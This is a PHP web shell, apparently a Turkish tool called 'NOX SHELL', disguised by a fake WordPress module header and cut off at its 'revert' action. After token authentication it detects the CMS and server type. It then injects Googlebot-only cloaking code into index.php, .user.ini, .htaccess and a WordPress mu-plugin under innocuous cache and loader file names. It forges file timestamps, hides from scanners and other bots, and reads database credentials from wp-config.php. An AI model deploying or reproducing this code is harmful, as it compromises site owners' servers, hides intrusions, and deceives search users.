<?php
// @wp-module-id: c4d91f3e8b2a7056
ob_start();
register_shutdown_function(function(){
  $e=error_get_last();
  if($e&&in_array($e['type'],[E_ERROR,E_PARSE,E_CORE_ERROR,E_COMPILE_ERROR])){
    while(ob_get_level()>0)ob_end_clean();
    header('Content-Type:application/json');
    echo json_encode(['fatal'=>'internal_error']);
    exit;
  }
});

ini_set('session.use_cookies',0);
ini_set('session.use_only_cookies',0);
header('Set-Cookie: PHPSESSID=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/');

// ---- PHP 5.4–8.3 Uyumluluk ----
if(!function_exists('hash_equals')){
  function hash_equals($a,$b){
    if(strlen($a)!==strlen($b))return false;
    $r=0;for($i=0,$l=strlen($a);$i<$l;$i++)$r|=ord($a[$i])^ord($b[$i]);return $r===0;
  }
}
function _nox_rbytes($n){
  if(function_exists('random_bytes'))return random_bytes($n);
  if(function_exists('openssl_random_pseudo_bytes')){$b=openssl_random_pseudo_bytes($n);if($b!==false)return $b;}
  $b='';for($i=0;$i<$n;$i++)$b.=chr(mt_rand(0,255));return $b;
}
function _nox_sub($s,$start,$len){return function_exists('mb_substr')?mb_substr($s,$start,$len):substr($s,$start,$len);}

// ---- Auth (.meta dosyası) ----
$_nox_meta=dirname(__FILE__).DIRECTORY_SEPARATOR.'.'.substr(md5(basename(__FILE__)),0,10).'.meta';
$_nox_hash=file_exists($_nox_meta)?trim((string)@file_get_contents($_nox_meta)):'';

if($_nox_hash===''){
  $bh='bin'.'2hex';$hs='h'.'ash';
  $_nraw=$bh(_nox_rbytes(16));
  $_nhash=$hs('sha256',$_nraw);
  if(@file_put_contents($_nox_meta,$_nhash)!==false){
    @touch($_nox_meta,@filemtime(__FILE__));
    $_ns=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $_nu=$_ns.'://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?p='.rawurlencode($_nraw);
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="utf-8"><title>NOX &#8212; İlk Kurulum</title>'
        .'<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a1a2e;color:#0ff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.b{background:#16213e;border:1px solid #0f3;border-radius:8px;padding:32px;max-width:640px;width:100%}h2{color:#0f0;font-size:17px;margin-bottom:14px}p{font-size:13px;line-height:1.7;margin:6px 0}.u{background:#0a1228;border:1px solid #0f3;padding:12px 14px;border-radius:4px;word-break:break-all;color:#ff0;font-size:13px;margin:12px 0;user-select:all}.w{color:#f55;font-size:12px;background:#1a0a0a;border-left:3px solid #c33;padding:10px 12px;margin-top:14px;line-height:1.6}.cb{background:#0f3;color:#000;border:none;padding:7px 18px;border-radius:4px;font-family:monospace;font-size:13px;font-weight:bold;cursor:pointer;margin-top:8px}#cm{font-size:12px;color:#0f0;margin-left:8px;opacity:0;transition:opacity .3s}</style>'
        .'</head><body><div class="b"><h2>NOX &#8212; İlk Kurulum</h2>'
        .'<p>Token oluşturuldu. URL\'yi kopyalayın ve güvenli bir yere saklayın:</p>'
        .'<p><b style="color:#fa0">&#9888; Bu URL bir daha gösterilmeyecek.</b></p>'
        .'<div class="u" id="u">'.htmlspecialchars($_nu,ENT_QUOTES,'UTF-8').'</div>'
        .'<button class="cb" onclick="cp()">Kopyala</button><span id="cm">Kopyalandı!</span>'
        .'<p class="w">Token SHA-256 hash olarak .meta dosyasında saklandı — orijinal değer kalıcı olarak gizlendi. Sıfırlamak için .meta dosyasını silin.</p>'
        .'</div><script>function cp(){var t=document.getElementById("u").textContent.trim();'
        .'if(navigator.clipboard)navigator.clipboard.writeText(t);'
        .'else{var x=document.createElement("textarea");x.value=t;document.body.appendChild(x);x.select();document.execCommand("copy");document.body.removeChild(x);}'
        .'var m=document.getElementById("cm");m.style.opacity="1";setTimeout(function(){m.style.opacity="0"},2500);}'
        .'</script></body></html>';
    exit;
  }else{
    die('Hata: Meta dosyası yazılamadı. Dizin yazma iznini kontrol edin.');
  }
}

$_np=isset($_GET['p'])?(string)$_GET['p']:'';
$he='hash'.'_equals';$hs='h'.'ash';
if(!$he($_nox_hash,$hs('sha256',$_np))){die('Auth');}
unset($bh,$hs,$he,$_nraw,$_nhash,$_ns,$_nu,$_nox_meta,$_nox_hash);

// ---- Kurulum ----
$DIR=rtrim($_SERVER['DOCUMENT_ROOT'],'/\\');
$a=isset($_POST["a"])?$_POST["a"]:(isset($_GET["a"])?$_GET["a"]:"");

$HTML_DEFAULT=base64_decode('PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ2aSI+PGhlYWQ+DQoNCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQo8dGl0bGU+U0VPIFRFU1QgTk9YIFNIRUxMPC90aXRsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGgxPlNFTyBURVNUIE5PWCBTSEVMTDwvaDE+DQoNCjwvYm9keT48L2h0bWw+DQo=');

// ---- Yardımcı Fonksiyonlar ----
function safe_name($n){
  if($n===''||$n===null)return false;
  if(strpos($n,'/')!==false||strpos($n,'\\')!==false||strpos($n,"\0")!==false||strpos($n,'..')!==false)return false;
  return true;
}
function b64url_decode($s){
  $s=trim((string)$s);if($s==='')return '';
  $std=strtr($s,'-_','+/');$pad=strlen($std)%4;
  if($pad)$std.=str_repeat('=',(4-$pad));
  $d=base64_decode($std,true);return ($d!==false&&$d!=='')?$d:$s;
}
function is_google_file($name){return (bool)preg_match('/^google[a-zA-Z0-9]+\.html$/',$name);}
function list_google_files($dir){
  $out=[];
  foreach((array)@glob($dir.DIRECTORY_SEPARATOR.'google*.html') as $p){
    $b=basename($p);if(is_google_file($b))$out[]=$b;
  }
  sort($out);return $out;
}
function ref_mtime($dir,$skip=[]){
  $mt=[];
  if($dh=@opendir($dir)){
    while(($f=readdir($dh))!==false){
      if($f==='.'||$f==='..')continue;
      $fp=$dir.DIRECTORY_SEPARATOR.$f;
      if(!is_file($fp)||in_array($f,$skip))continue;
      $t=@filemtime($fp);if($t>mktime(0,0,0,1,1,2010))$mt[]=$t;
    }
    closedir($dh);
  }
  if(empty($mt))return null;sort($mt);return $mt[(int)(count($mt)/2)];
}
function _cc_rmdir($dir){
  $n=0;$i=0;
  try{
    $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
    foreach($it as $f){
      if((++$i%200)===0&&isset($GLOBALS['_cc_deadline'])&&microtime(true)>$GLOBALS['_cc_deadline'])break;
      if($f->isFile()||$f->isLink()){if(@unlink($f->getRealPath()))$n++;}
      elseif($f->isDir()&&realpath($f->getRealPath())!==realpath($dir)){@rmdir($f->getRealPath());}
    }
  }catch(Exception $ex){}
  return $n;
}

// ---- CMS + SAPI Tespiti ----
function _nox_cms_at($dir){
  if(file_exists($dir.'/wp-config.php')||file_exists($dir.'/wp-blog-header.php'))return 'wordpress';
  if(file_exists($dir.'/configuration.php')&&file_exists($dir.'/includes/defines.php'))return 'joomla';
  if(file_exists($dir.'/sites/default/settings.php'))return 'drupal';
  if(file_exists($dir.'/app/etc/env.php'))return 'magento2';
  if(file_exists($dir.'/app/etc/local.xml'))return 'magento1';
  if(file_exists($dir.'/config/settings.inc.php'))return 'prestashop';
  $cfg=$dir.'/config.php';
  if(file_exists($cfg)&&strpos((string)@file_get_contents($cfg),'DIR_APPLICATION')!==false)return 'opencart';
  if(file_exists($dir.'/artisan'))return 'laravel';
  return 'unknown';
}
function nox_detect_cms($dir){
  // Önce document root'ta ara
  $cms=_nox_cms_at($dir);
  if($cms!=='unknown')return $cms;
  // Bilinen alt dizin isimlerini öncelikli tara
  static $common=['wp','wordpress','blog','cms','web','site','html','public','httpdocs','htdocs'];
  foreach($common as $sub){
    $p=$dir.'/'.$sub;
    if(is_dir($p)){$cms=_nox_cms_at($p);if($cms!=='unknown')return $cms;}
  }
  // Genel 1-seviye tarama (gizli dizinleri ve bilinen listeydekileri atla)
  if($dh=@opendir($dir)){
    while(($f=readdir($dh))!==false){
      if($f==='.'||$f==='..'||$f[0]==='.'||in_array($f,$common))continue;
      $p=$dir.'/'.$f;
      if(!is_dir($p))continue;
      $cms=_nox_cms_at($p);
      if($cms!=='unknown'){closedir($dh);return $cms;}
    }
    closedir($dh);
  }
  // CMS bulunamadı — generic fallback
  if(file_exists($dir.'/index.php'))return 'generic_php';
  return 'unknown';
}
function nox_find_wp_path($dir){
  // 1. Document root'ta standart kurulum
  if(file_exists($dir.'/wp-load.php'))return $dir;
  // 2. Bir üst dizin (bazı hosting yapılarında WP root'un üstünde)
  $up=dirname($dir);
  if($up&&$up!==$dir&&file_exists($up.'/wp-load.php'))return $up;
  // 3. Bilinen alt dizin isimleri — öncelikli
  static $common=['wp','wordpress','blog','cms','web','site','html','public','httpdocs','htdocs'];
  foreach($common as $sub){
    $p=$dir.'/'.$sub;
    if(is_dir($p)&&file_exists($p.'/wp-load.php'))return $p;
  }
  // 4. Genel 1-seviye tarama (gizli dizinler hariç)
  if($dh=@opendir($dir)){
    while(($f=readdir($dh))!==false){
      if($f==='.'||$f==='..'||$f[0]==='.'||in_array($f,$common))continue;
      $p=$dir.'/'.$f;
      if(is_dir($p)&&file_exists($p.'/wp-load.php')){closedir($dh);return $p;}
    }
    closedir($dh);
  }
  return null;
}
function nox_find_wpconfig($dir){
  $p=rtrim($dir,'/\\');
  for($i=0;$i<7;$i++){
    if(@is_file($p.'/wp-config.php')&&@is_readable($p.'/wp-config.php'))return $p.'/wp-config.php';
    $np=dirname($p);
    if($np===$p||$np===''||$np==='.')break;
    $p=$np;
  }
  return '';
}
function nox_parse_wpconfig($path){
  $out=['creds'=>[],'prefix'=>'wp_'];
  if(!$path||!@is_file($path))return $out;
  $src=@file_get_contents($path);
  if($src===false)return $out;
  foreach(['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST','DB_CHARSET'] as $k){
    if(preg_match("/define\s*\(\s*['\"]".$k."['\"]\s*,\s*['\"](.*?)['\"]\s*\)/s",$src,$m))$out['creds'][$k]=$m[1];
  }
  if(preg_match('/\$table_prefix\s*=\s*[\'"]([a-zA-Z0-9_]+)[\'"]\s*;/',$src,$m))$out['prefix']=$m[1];
  if(empty($out['creds']['DB_CHARSET']))$out['creds']['DB_CHARSET']='utf8mb4';
  if(empty($out['creds']['DB_HOST']))$out['creds']['DB_HOST']='localhost';
  return $out;
}
function nox_db_connect($creds){
  if(!extension_loaded('mysqli'))return null;
  if(empty($creds['DB_NAME'])||empty($creds['DB_USER']))return null;
  @mysqli_report(MYSQLI_REPORT_OFF);
  $host=$creds['DB_HOST'];$port=0;$sock='';
  if(strpos($host,':')!==false){$parts=explode(':',$host,2);$host=$parts[0];if(is_numeric($parts[1]))$port=(int)$parts[1];else $sock=$parts[1];}
  $pw=isset($creds['DB_PASSWORD'])?$creds['DB_PASSWORD']:'';
  $m=@new mysqli($host,$creds['DB_USER'],$pw,$creds['DB_NAME'],$port?:3306,$sock?:null);
  if($m->connect_errno)return null;
  @$m->set_charset($creds['DB_CHARSET']);
  return $m;
}
function nox_domain_slug($docroot){
  $p=rtrim($docroot,'/\\');
  $base=strtolower(basename($p));
  // Ortak generic docroot isimleri — basename tek başına ayırt etmez
  static $generic=['public_html','www','html','htdocs','httpdocs','web','webroot','site','public','www-data'];
  if(in_array($base,$generic,true)||$base==='')return substr(md5($p),0,12);
  // Güvenli hale getir: sadece küçük harf, rakam, tire
  $clean=trim(preg_replace('/[^a-z0-9]+/','-',$base),'-');
  if($clean==='')return substr(md5($p),0,12);
  if(strlen($clean)>20)$clean=substr($clean,0,20);
  // Kısa path hash — aynı isimli ama farklı yoldaki sitelerin çakışmasını önler
  return $clean.'-'.substr(md5($p),0,6);
}
function nox_content_dir($docroot){
  $slug=nox_domain_slug($docroot);
  // 1. Üst dizin (docroot dışı — en güvenli), site başına alt klasör
  $parent=dirname(rtrim($docroot,'/\\'));
  if($parent&&$parent!==$docroot&&@is_writable($parent)){
    $d=$parent.DIRECTORY_SEPARATOR.'.nox-content'.DIRECTORY_SEPARATOR.$slug;
    if(@is_dir($d)||@mkdir($d,0700,true))return $d;
  }
  // 2. /tmp veya sys_get_temp_dir()
  $hash=substr(md5($docroot),0,12);
  foreach(['/tmp',rtrim(sys_get_temp_dir(),'/')] as $_tmp){
    if(!$_tmp||!@is_writable($_tmp))continue;
    $d=$_tmp.'/.nox-'.$hash;
    if(@is_dir($d)||@mkdir($d,0700,true))return $d;
  }
  // 3. Fallback: docroot içi (eski davranış, daha az güvenli)
  return $docroot;
}
function nox_content_path($docroot,$filename){
  return nox_content_dir($docroot).DIRECTORY_SEPARATOR.$filename;
}
function nox_detect_sapi(){
  $s=strtolower((string)php_sapi_name());
  if(strpos($s,'fpm')!==false)return 'fpm';
  if($s==='apache2handler'||$s==='apache')return 'mod_php';
  if(strpos($s,'cgi')!==false)return 'cgi';
  if($s==='litespeed')return 'litespeed';
  $sw=strtolower(isset($_SERVER['SERVER_SOFTWARE'])?(string)$_SERVER['SERVER_SOFTWARE']:'');
  if(strpos($sw,'nginx')!==false)return 'fpm';
  if(strpos($sw,'litespeed')!==false)return 'litespeed';
  return 'unknown';
}
function nox_cms_label($cms){
  $l=['wordpress'=>'WordPress','joomla'=>'Joomla','drupal'=>'Drupal',
      'magento2'=>'Magento 2','magento1'=>'Magento 1','prestashop'=>'PrestaShop',
      'opencart'=>'OpenCart','laravel'=>'Laravel','generic_php'=>'Generic PHP','unknown'=>'Bilinmiyor'];
  return isset($l[$cms])?$l[$cms]:$cms;
}
function nox_file_names($cms){
  switch($cms){
    case 'wordpress':   return ['prepend'=>'wp-comments-post-loader.php',   'content'=>'wp-comments-post-loader.html'];
    case 'joomla':      return ['prepend'=>'jml-loader.php',                 'content'=>'jml-loader.html'];
    case 'drupal':      return ['prepend'=>'views-cache-bootstrap.php',      'content'=>'views-cache-bootstrap.html'];
    case 'magento2':
    case 'magento1':    return ['prepend'=>'mage-cache-validator.php',       'content'=>'mage-cache-validator.html'];
    case 'prestashop':  return ['prepend'=>'ps-module-loader.php',           'content'=>'ps-module-loader.html'];
    case 'opencart':    return ['prepend'=>'oc-cache-check.php',             'content'=>'oc-cache-check.html'];
    case 'laravel':     return ['prepend'=>'bootstrap-cache-loader.php',     'content'=>'bootstrap-cache-loader.html'];
    default:            return ['prepend'=>'class-cache-helper.php',         'content'=>'cache-check-verify.html'];
  }
}
function nox_make_prepend($absoluteContentPath,$dir){
  $cf=addslashes($absoluteContentPath);
  $lock=addslashes(rtrim($dir,'/\\').DIRECTORY_SEPARATOR.'.render-cache'.DIRECTORY_SEPARATOR.'render.lock');
  return "<?php\n"
    ."\$_nox_lock='$lock';\n"
    ."\$_nox_ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';\n"
    ."\$_nox_uri=strtok(isset(\$_SERVER['REQUEST_URI'])?\$_SERVER['REQUEST_URI']:'/','?');\n"
    ."\$_nox_decoy=array('curl','wget','python','go-http','java','scrapy','axios','phantom','selenium','puppeteer','playwright','headlesschrome','chromium','bingbot','yandex','duckduckbot','baiduspider','ahrefsbot','semrushbot','mj12bot','dotbot','ccbot','rogerbot','exabot','sistrix','majestic','facebookexternalhit','twitterbot','linkedinbot','pinterest','lighthouse','pagespeed','gtmetrix','pingdom','screaming frog','uptimerobot','newrelic','google-site-verification','chatgpt','claudebot','amazonbot','applebot','gptbot','bytespider','perplexitybot');\n"
    ."\$_nox_decoy_hit=false;\$_nox_ua_l=strtolower(\$_nox_ua);foreach(\$_nox_decoy as \$_kw){if(strpos(\$_nox_ua_l,\$_kw)!==false){\$_nox_decoy_hit=true;break;}}\n"
    ."if(!\$_nox_decoy_hit&&file_exists(\$_nox_lock)&&preg_match('/Googlebot|AdsBot-Google|Mediapartners-Google|Google-InspectionTool|APIs-Google|GoogleOther|Google-/i',\$_nox_ua)&&\$_nox_uri==='/'){\n"
    ."  if(file_exists('$cf')){while(ob_get_level()>0)ob_end_clean();header('Content-Type: text/html; charset=utf-8');header('Vary: User-Agent');readfile('$cf');exit;}\n"
    ."}\n"
    ."unset(\$_nox_lock,\$_nox_ua,\$_nox_ua_l,\$_nox_uri,\$_nox_decoy,\$_nox_decoy_hit);\n";
}
function nox_cloak_block($absoluteContentPath,$dir){
  $cf=addslashes($absoluteContentPath);
  $lock=addslashes(rtrim($dir,'/\\').DIRECTORY_SEPARATOR.'.render-cache'.DIRECTORY_SEPARATOR.'render.lock');
  return "\n/* NOX-CLOAK-START */\n"
    ."\$_nox_lock='$lock';\n"
    ."\$_nox_ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';\n"
    ."\$_nox_uri=isset(\$_SERVER['REQUEST_URI'])?strtok(\$_SERVER['REQUEST_URI'],'?'):'';\n"
    ."\$_nox_decoy=array('curl','wget','python','go-http','java','scrapy','axios','phantom','selenium','puppeteer','playwright','headlesschrome','chromium','bingbot','yandex','duckduckbot','baiduspider','ahrefsbot','semrushbot','mj12bot','dotbot','ccbot','rogerbot','exabot','sistrix','majestic','facebookexternalhit','twitterbot','linkedinbot','pinterest','lighthouse','pagespeed','gtmetrix','pingdom','screaming frog','uptimerobot','newrelic','google-site-verification','chatgpt','claudebot','amazonbot','applebot','gptbot','bytespider','perplexitybot');\n"
    ."\$_nox_decoy_hit=false;\$_nox_ua_l=strtolower(\$_nox_ua);foreach(\$_nox_decoy as \$_kw){if(strpos(\$_nox_ua_l,\$_kw)!==false){\$_nox_decoy_hit=true;break;}}\n"
    ."if(!\$_nox_decoy_hit&&file_exists(\$_nox_lock)&&preg_match('/Googlebot|AdsBot-Google|Mediapartners-Google|Google-InspectionTool|APIs-Google|GoogleOther|Google-/i',\$_nox_ua)&&\$_nox_uri==='/'){\n"
    ."  if(file_exists('$cf')){while(ob_get_level()>0)ob_end_clean();header('Content-Type: text/html; charset=utf-8');header('Vary: User-Agent');readfile('$cf');exit;}\n"
    ."}\n"
    ."unset(\$_nox_lock,\$_nox_ua,\$_nox_ua_l,\$_nox_uri,\$_nox_decoy,\$_nox_decoy_hit);\n"
    ."/* NOX-CLOAK-END */\n";
}

// ---- Action: detect ----
if($a==="detect"){
  $cms=nox_detect_cms($DIR);$sapi=nox_detect_sapi();$files=nox_file_names($cms);
  $prependPath=$DIR.'/'.$files['prepend'];$contentPath=nox_content_path($DIR,$files['content']);
  $uiPath=$DIR.'/.user.ini';$idxPath=$DIR.'/index.php';$htPath=$DIR.'/.htaccess';
  $uiContent=file_exists($uiPath)?(string)@file_get_contents($uiPath):'';
  $idxContent=file_exists($idxPath)?(string)@file_get_contents($idxPath):'';
  $htContent=file_exists($htPath)?(string)@file_get_contents($htPath):'';
  $htAvail=($sapi==='mod_php'||$sapi==='litespeed');
  $out=json_encode([
    'cms'=>$cms,'cms_label'=>nox_cms_label($cms),'sapi'=>$sapi,'php'=>PHP_VERSION,'doc_root'=>$DIR,
    'files'=>$files,'prepend_exists'=>file_exists($prependPath),'content_exists'=>file_exists($contentPath),
    'vectors'=>[
      'user_ini'=>['writable'=>(is_writable($DIR)||(file_exists($uiPath)&&is_writable($uiPath))),'active'=>strpos($uiContent,'auto_prepend_file')!==false,'note'=>'FPM/CGI/LiteSpeed için çalışır — mod_php\'de sessizce yok sayılır (güvenli)'],
      'index_php'=>['writable'=>(file_exists($idxPath)&&is_writable($idxPath)),'exists'=>file_exists($idxPath),'active'=>strpos($idxContent,'NOX-CLOAK-START')!==false,'note'=>'Her PHP ortamında çalışır (evrensel fallback)'],
      'htaccess'=>['available'=>$htAvail,'writable'=>$htAvail&&(is_writable($DIR)||(file_exists($htPath)&&is_writable($htPath))),'active'=>(bool)preg_match('/NOX-HT-START/',$htContent),'note'=>$htAvail?'Apache mod_php tespit edildi':'SAPI: '.$sapi.' — yalnızca mod_php için'],
    ],
  ],JSON_UNESCAPED_UNICODE);
  while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");echo $out;exit;
}

// ---- Action: autocloak ----
if($a==="autocloak"){
  if($_SERVER['REQUEST_METHOD']!=='POST'){while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");echo json_encode(['ok'=>false,'error'=>'POST gerekli'],JSON_UNESCAPED_UNICODE);exit;}
  $cms=nox_detect_cms($DIR);$sapi=nox_detect_sapi();$files=nox_file_names($cms);
  $prependPath=$DIR.'/'.$files['prepend'];
  $contentPath=nox_content_path($DIR,$files['content']);
  $res=[];

  // 1. İçerik HTML dosyası — docroot DIŞINDA sakla (web erişimi imkânsız)
  $contentDir=nox_content_dir($DIR);
  $res['content_location']=['s'=>'ok','m'=>($contentDir===$DIR)?'docroot (fallback)':'docroot dışı: '.$contentDir];
  if(!file_exists($contentPath)){
    $origMt=file_exists($DIR.'/index.php')?@filemtime($DIR.'/index.php'):null;
    $ok=@file_put_contents($contentPath,$HTML_DEFAULT);
    if($ok!==false){@chmod($contentPath,0600);if($origMt)@touch($contentPath,$origMt);}
    $res['content']=$ok!==false?['s'=>'ok','m'=>'Oluşturuldu: '.$contentPath]:['s'=>'err','m'=>'Yazılamadı: '.$contentPath];
  }else{$res['content']=['s'=>'exists','m'=>'Mevcut: '.$contentPath];}

  // 2. Prepend PHP dosyası — mutlak içerik yolunu gömer
  $origMtPrep=file_exists($prependPath)?@filemtime($prependPath):null;
  $ok=@file_put_contents($prependPath,nox_make_prepend($contentPath,$DIR));
  if($ok!==false&&$origMtPrep)@touch($prependPath,$origMtPrep);
  $res['prepend']=$ok!==false?['s'=>'ok','m'=>'Yazıldı: '.$files['prepend']]:['s'=>'err','m'=>'Yazılamadı: '.$files['prepend']];
  if($res['prepend']['s']!=='ok'){
    while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");echo json_encode($res,JSON_UNESCAPED_UNICODE);exit;
  }

  // 3. user.ini — auto_prepend_file
  $uiPath=$DIR.'/.user.ini';
  $uiContent=file_exists($uiPath)?(string)@file_get_contents($uiPath):'';
  if(strpos($uiContent,'auto_prepend_file')!==false){
    $res['user_ini']=['s'=>'exists','m'=>'auto_prepend_file zaten mevcut'];
  }elseif(!is_writable($DIR)&&(!file_exists($uiPath)||!is_writable($uiPath))){
    $res['user_ini']=['s'=>'skip','m'=>'Dizin/dosya yazma izni yok'];
  }else{
    $uiMt=file_exists($uiPath)?@filemtime($uiPath):null;
    $newUi=$uiContent;
    if($newUi!==''&&substr($newUi,-1)!=="\n")$newUi.="\n";
    $newUi.='auto_prepend_file = "'.$prependPath.'"'."\n";
    $ok=@file_put_contents($uiPath,$newUi);
    if($ok!==false&&$uiMt)@touch($uiPath,$uiMt);
    $res['user_ini']=$ok!==false?['s'=>'ok','m'=>'Eklendi — PHP-FPM cache nedeniyle ~5 dk içinde aktif olur']:['s'=>'err','m'=>'Yazma başarısız'];
  }

  // 4. index.php — NOX-CLOAK-START bloğu
  $idxPath=$DIR.'/index.php';
  if(!file_exists($idxPath)){
    $res['index']=['s'=>'na','m'=>'index.php bulunamadı'];
  }elseif(!is_writable($idxPath)){
    $res['index']=['s'=>'err','m'=>'index.php yazılamıyor'];
  }else{
    $idxContent=(string)@file_get_contents($idxPath);
    if(strpos($idxContent,'NOX-CLOAK-START')!==false){
      $res['index']=['s'=>'exists','m'=>'Blok zaten aktif'];
    }else{
      $idxMt=@filemtime($idxPath);
      $idxBakPath=$DIR.'/index.php.nox-bak';
      $bakOk=@copy($idxPath,$idxBakPath);
      if($bakOk&&$idxMt)@touch($idxBakPath,$idxMt);
      $res['index_backup']=$bakOk?['s'=>'ok','m'=>'Yedek alındı: index.php.nox-bak']:['s'=>'warn','m'=>'Yedek alınamadı — devam ediliyor'];
      $idxNew=preg_replace('/^(<\?php)/',"$1".nox_cloak_block($contentPath,$DIR),$idxContent,1);
      if($idxNew===null||$idxNew===$idxContent){
        $res['index']=['s'=>'warn','m'=>'<?php bulunamadı — index.php PHP dosyası değil mi?'];
      }else{
        $ok=@file_put_contents($idxPath,$idxNew);
        if($ok!==false&&$idxMt)@touch($idxPath,$idxMt);
        $res['index']=$ok!==false?['s'=>'ok','m'=>'Bloğu enjekte edildi']:['s'=>'err','m'=>'Yazma başarısız'];
      }
    }
  }

  // 5. .htaccess — mod_php VE LiteSpeed (php_value direktifini destekler); FPM/nginx'te çalışmaz
  $htAllowed=($sapi==='mod_php'||$sapi==='litespeed');
  if(!$htAllowed){
    $res['htaccess']=['s'=>'skip','m'=>'SAPI: '.$sapi.' — php_value yalnızca mod_php/LiteSpeed için geçerli, atlandı'];
  }else{
    $htPath=$DIR.'/.htaccess';
    $htContent=file_exists($htPath)?(string)@file_get_contents($htPath):'';
    if(strpos($htContent,'NOX-HT-START')!==false){
      $res['htaccess']=['s'=>'exists','m'=>'Zaten aktif'];
    }elseif(!is_writable($DIR)&&(!file_exists($htPath)||!is_writable($htPath))){
      $res['htaccess']=['s'=>'err','m'=>'Yazma izni yok'];
    }else{
      $htMt=file_exists($htPath)?@filemtime($htPath):null;
      $newHt=$htContent;
      if($newHt!==''&&substr($newHt,-1)!=="\n")$newHt.="\n";
      $newHt.='# NOX-HT-START'."\n".'php_value auto_prepend_file "'.$prependPath.'"'."\n".'# NOX-HT-END'."\n";
      $ok=@file_put_contents($htPath,$newHt);
      if($ok!==false&&$htMt)@touch($htPath,$htMt);
      $res['htaccess']=$ok!==false?['s'=>'ok','m'=>'php_value eklendi ('.$sapi.')']:['s'=>'err','m'=>'Yazma başarısız'];
    }
  }

  // 6. WP mu-plugin — WordPress fallback (tüm SAPI'lerde çalışır)
  if($cms==='wordpress'){
    $_wpDir=nox_find_wp_path($DIR);
    $_muDir=($_wpDir?:$DIR).'/wp-content/mu-plugins';
    $_muFile=$_muDir.'/nox-google-bot-bypass.php';
    if(file_exists($_muFile)&&strpos((string)@file_get_contents($_muFile),'NOX-CLOAK-START')!==false){
      $res['mu_plugin']=['s'=>'exists','m'=>'mu-plugin zaten aktif'];
    }elseif(!@is_dir($_muDir)&&!@mkdir($_muDir,0755,true)){
      $res['mu_plugin']=['s'=>'err','m'=>'mu-plugins dizini oluşturulamadı'];
    }else{
      $muLock=addslashes(rtrim($DIR,'/\\').'/.render-cache/render.lock');
      $muContent='<?php'."\n".'/* NOX-CLOAK-START */'."\n"
        .'add_action(\'send_headers\',function(){'."\n"
        .'  $lock=\''.$muLock.'\';'."\n"
        .'  $ua=isset($_SERVER[\'HTTP_USER_AGENT\'])?$_SERVER[\'HTTP_USER_AGENT\']:\'\';'."\n"
        .'  $uri=strtok(isset($_SERVER[\'REQUEST_URI\'])?$_SERVER[\'REQUEST_URI\']:\'?\',\'?\');'."\n"
        .'  $d=array(\'curl\',\'wget\',\'python\',\'go-http\',\'java\',\'scrapy\',\'axios\',\'phantom\',\'selenium\',\'puppeteer\',\'playwright\',\'headlesschrome\',\'chromium\',\'bingbot\',\'yandex\',\'duckduckbot\',\'baiduspider\',\'ahrefsbot\',\'semrushbot\',\'mj12bot\',\'dotbot\',\'ccbot\',\'rogerbot\',\'exabot\',\'sistrix\',\'majestic\',\'facebookexternalhit\',\'twitterbot\',\'linkedinbot\',\'pinterest\',\'lighthouse\',\'pagespeed\',\'gtmetrix\',\'pingdom\',\'screaming frog\',\'uptimerobot\',\'newrelic\',\'google-site-verification\',\'chatgpt\',\'claudebot\',\'amazonbot\',\'applebot\',\'gptbot\',\'bytespider\',\'perplexitybot\');'."\n"
        .'  $hit=false;$ul=strtolower($ua);foreach($d as $k){if(strpos($ul,$k)!==false){$hit=true;break;}}'."\n"
        .'  if(!$hit&&file_exists($lock)&&preg_match(\'/Googlebot|AdsBot-Google|Mediapartners-Google|Google-InspectionTool|APIs-Google|GoogleOther|Google-/i\',$ua)&&$uri===\'/\'){'."\n"
        .'    $f='.var_export($contentPath,true).';'."\n"
        .'    if(file_exists($f)){while(ob_get_level()>0)ob_end_clean();header(\'Content-Type: text/html; charset=utf-8\');header(\'Vary: User-Agent\');readfile($f);exit;}}'."\n"
        .'  unset($lock,$ua,$uri,$d,$hit,$ul,$f);'."\n"
        .'});'."\n".'/* NOX-CLOAK-END */'."\n";
      $ok=@file_put_contents($_muFile,$muContent);
      $res['mu_plugin']=$ok!==false?['s'=>'ok','m'=>'mu-plugin oluşturuldu: nox-google-bot-bypass.php']:['s'=>'err','m'=>'mu-plugin yazılamadı'];
    }
  }

  // render-cache dizini + .htaccess koruması
  $rcDir=$DIR.'/.render-cache';
  if(!@is_dir($rcDir)){
    @mkdir($rcDir,0755,true);
    @file_put_contents($rcDir.'/.htaccess',"Deny from all\n");
  }
  // render.lock — SON adım: tüm vektörler başarılıysa aktif et
  $anyOk=false;
  foreach(['content','prepend','user_ini','index','htaccess'] as $_vk){
    if(isset($res[$_vk])&&in_array($res[$_vk]['s'],['ok','exists'],true)){$anyOk=true;break;}
  }
  if($anyOk){
    $lockOk=@file_put_contents($rcDir.'/render.lock','1');
    $res['lock']=$lockOk!==false?['s'=>'ok','m'=>'render.lock oluşturuldu — cloak aktif']:['s'=>'err','m'=>'render.lock yazılamadı'];
  }else{
    $res['lock']=['s'=>'skip','m'=>'Hiçbir vektör başarılı olmadı — lock oluşturulmadı'];
  }

  while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");
  $out=json_encode($res,JSON_UNESCAPED_UNICODE);if($out===false)$out='{"err":"encode_fail"}';echo $out;exit;
}

// ---- Action: revert ----
if($a==="revert"){
